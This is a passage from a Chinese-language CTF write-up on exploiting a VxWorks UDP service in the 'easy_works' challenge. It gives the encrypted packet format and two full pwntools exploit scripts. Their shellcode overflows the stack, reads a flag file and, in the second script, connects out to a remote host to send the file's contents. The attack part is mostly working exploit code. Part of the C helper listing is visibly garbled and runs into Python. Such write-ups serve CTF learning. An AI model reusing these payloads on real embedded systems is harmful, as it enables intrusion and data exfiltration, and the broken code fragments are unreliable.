          }
        }
      }
      return v1;
    }
###  1.3 数据包格式分析
​ 攻击分两部分，一部分是提前植入攻击代码在ip_addr全局变量区，第二部分触发攻击代码，栈溢出执行攻击代码。其中数据包格式如下：
    ##第一层封装
    crc32[magic + packet_len + case1 + case2 + pad + encrypt_AES[packet]]
    //magic = 4b5c6d7e  4byte  函数标识
    //packet_len = len(packet)  2byte 后续加密数据包长度  2byte
    //case1 = 3,1,0，选择功能函数选项，填3会进入参数设置区，选择1会进入send_pkt函数区 1byte
    //case2 = 2,1   选择解密方式，为了触发漏洞这里填2        1byte
    ##第二层封装
    encrypt_AES[case3 + payload_len + payload]
    //case3 = 0,1,2,3,4 其中0为修改set_ipaddr，1为set_port，2为set_password,3为set_IV，4为set_BEAT    4byte
    //payload_len = len(payload) 2byte
    //payload 攻击代码
###  1.4 crc32解密与AES解密
​
数据包分析中可以发现，数据包需要通过CRC32校验和AES解密，才能把真正的packet发送到服务器中，在前面的分析中我们可以找到固定IV和口令，加密算法为AES_CBC模式，为了节省时间，可以使用内核文件中的加解密函数。
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    const char *executable = "./easy_works.elf";
    int main(int argc, char *argv[])
    {
        if (argc = len(s)
        print('enc %d %s => %d %s' % (len(s), s, len(d), d.hex()))
        return d
    def fix_crc(s):
        p = process(['./e', 'crc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) == len(s)
        print('crc %s => %s' % (s, d.hex()))
        return d
    magic = b'\x7E\x6D\x5C\x4B'
    _open = 0x487E6E
    _read = 0x487925
    _printf = 0x482C0A
    _socket = 0x4B1DB2
    _connect = 0x4B1B53
    zbufSockBufSendto = 0x454C4F
    ebp = 0x677608
    filename = ebp - 0x30 + 0x200
    sockaddr = filename + 0x20
    payload = b'0.0.0.0\x00'.ljust(0x30, b'X')
    payload += p32(ebp - 0x300) + p32(ebp + 8)
    payload += asm('''
    sub esp, 0x400
    xor eax, eax
    mov [esp+8], eax
    ; mov eax, 2
    mov [esp+4], eax
    mov eax, %#x
    mov [esp], eax
    mov eax, %#x
    call eax
    mov ecx, 0x100
    mov [esp+8], ecx
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov [esp], eax
    mov edx, %#x
    call edx
    lea ebx, [esp + 0x80]
    mov [esp], ebx
    mov eax, %#x
    call eax
    ''' % (filename, _open, _read, _printf))
    payload = payload.ljust(0x200)
    payload += b'/ata01:1/flag\x00'.ljust(0x20)
    master_addr = encrypt(p32(0) + p16(len(payload)) + payload)
    set_master_addr_pkt = fix_crc(magic + p16(len(master_addr)) + p8(3) + p8(2) + p32(0) + p32(0) + master_addr)
    key = encrypt(b'dorimifasolaxi\x00')
    req_beat_pkt = fix_crc(magic + p16(len(key)) + p8(1) + p8(2) + p32(0) + p32(0) + key)
    r = remote('127.0.0.1', 2002, typ='udp')
    r.send(set_master_addr_pkt)
    raw_input('beat')
    r.send(req_beat_pkt)
攻击效果如下：
附上通过zbufSockbufsend函数将flag传送到远端的exp，但是我自己搭建的环境并没有成功，包括我使用sendto进行发送依旧连接不成功，不知道为何，请各位大牛赐教：
    from pwn import *
    # rwctf{3af93fd83c6d9b4188d236225347e480}
    context.arch = 'i386'
    HOST = '127.0.0.1'
    PORT = 0x4141
    def encrypt(s):
        p = process(['./e', 'enc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) >= len(s)
        print('enc %d %s => %d %s' % (len(s), s.hex(), len(d), d.hex()))
        return d
    def fix_crc(s):
        p = process(['./e', 'crc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) == len(s)
        print('crc %s => %s' % (s.hex(), d.hex()))
        return d
    magic = b'\x7E\x6D\x5C\x4B'
    _open = 0x487E6E
    _read = 0x487925
    _printf = 0x482C0A
    _socket = 0x4B1DB2
    _connect = 0x4B1B53
    zbufSockBufSend = 0x454C4F
    ebp = 0x677608
    filename = ebp - 0x30 + 0x200
    sockaddr = filename + 0x20
    payload = b'0.0.0.0\x00'.ljust(0x30, b'X')
    payload += p32(ebp - 0x300) + p32(ebp + 8)
    payload += asm('''
    sub esp, 0x400
    xor eax, eax
    mov [esp+8], eax
    ; mov eax, 2
    mov [esp+4], eax
    mov eax, %#x
    mov [esp], eax
    mov eax, %#x
    call eax
    mov ecx, 0x100
    mov [esp+8], ecx
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov [esp], eax
    mov edx, %#x
    call edx
    xor eax, eax
    mov [esp+8], eax
    inc al
    mov [esp+4], eax
    inc al
    mov [esp], eax
    mov eax, %#x
    call eax
    mov [esp+0x60], eax
    mov [esp], eax
    mov eax, %#x
    mov [esp+4], eax
    mov eax, 16
    mov [esp+8], eax
    mov eax, %#x
    call eax
    mov eax, [esp+0x60]
    mov [esp], eax
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov eax, 0x100
    mov [esp+8], eax
    xor eax, eax
    mov [esp+0xc], eax
    mov [esp+0x10], eax
    mov [esp+0x14], eax
    mov eax, %#x
    call eax
    ''' % (filename, _open, _read, _socket, sockaddr, _connect, zbufSockBufSend))
    payload = payload.ljust(0x200)
    payload += b'/ata01:1/flag\x00'.ljust(0x20)
    payload += b'\x10\x02' + p16(PORT) + bytes(map(int, HOST.split('.')))
    print len(payload)
    master_addr = encrypt(p32(0) + p16(len(payload)) + payload)
    set_master_addr_pkt = fix_crc(magic + p16(len(master_addr)) + p8(3) + p8(2) + p32(0) + p32(0) + master_addr)
    key = encrypt(b'dorimifasolaxi\x00')
    req_beat_pkt = fix_crc(magic + p16(len(key)) + p8(1) + p8(2) + p32(0) + p32(0) + key)
    r = remote('13.52.189.117', 39707, typ='udp')
    r.send(set_master_addr_pkt)
    raw_input('beat')
    r.send(req_beat_pkt)
## 0x02 基础知识-zbuf套接字及其应用
​ VxWorks除了支持标准的BSD4.4套接字接口外，还提供了一种零拷贝缓冲区（Zero-copy Buffer，简称ZBUF）套接字接口。
    //接收数据函数usrSockRecv
    int usrSockRecv{
        int fd,/*套接字文件描述符*/
        char *buf, /*接收数据缓冲区*/
        int bufLength,/*缓冲区长度*/
        int flags,/*数据类型标识符*/
    }
ZBUF套接字的网络通信模型应用
    //1、建立套接字
    fd = socket(AF_INET,SOCK_DGRAM,0)
    //2、绑定套接字
    bind(fd,(struct sockaddr *)&serverAddr,sockAddrSize)
    //3、接收报文
    Recvfd = zbufSockRecvfrom(fd,0,&recvlen，（struct sockaddr *）&clientAddr,&sockAddrSize)
    ZBUF_ID zbufSockRecvfrom
        (
        int               s,       /* socket to receive from */
        int               flags,   /* flags to underlying protocols */
        int *             pLen,    /* number of bytes requested/returned */
        struct sockaddr * from,    /* where to copy sender's addr */
        int *             pFromLen /* value/result length of from */
        )
        //4、zbuf数据操作
    zbufExtractCopy(Recvfd,NULL,0,(caddr_t)&recvBuff,bufflength)
    //该函数从接收报文的ZBUF中提取客户端的请求信息。
    int zbufExtractCopy
        (
        ZBUF_ID  zbufId,  /* zbuf from which data is copied */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        caddr_t  buf,     /* buffer into which data is copied */
        int      len      /* number of bytes to copy */
        )
    ZBUF_SEG zbufCut
        (
        ZBUF_ID  zbufId,  /* zbuf from which bytes are cut */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        int      len      /* number of bytes to cut */
        )
    //zbufInsert(zSendfd,0,segLen,zMsgfd)，函数zbufInsert()将需要发送的数据插入一个ZBUF中准备发送。
    ZBUF_SEG zbufInsert
        (
        ZBUF_ID  zbufId1, /* zbuf to insert zbufId2 into */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        ZBUF_ID  zbufId2  /* zbuf to insert into zbufId1 */
        )
    //5、发送报文
    zbufSockSendto(fd,zSendfd,zbuflength(zSendfd),0,(struct sockaddr *)&clientAddr,sockAddrSize)
    zbufSockBufSend()
    //关闭ZBUF、关闭套接字
    zbufDelete(zSendfd)
    close(fd)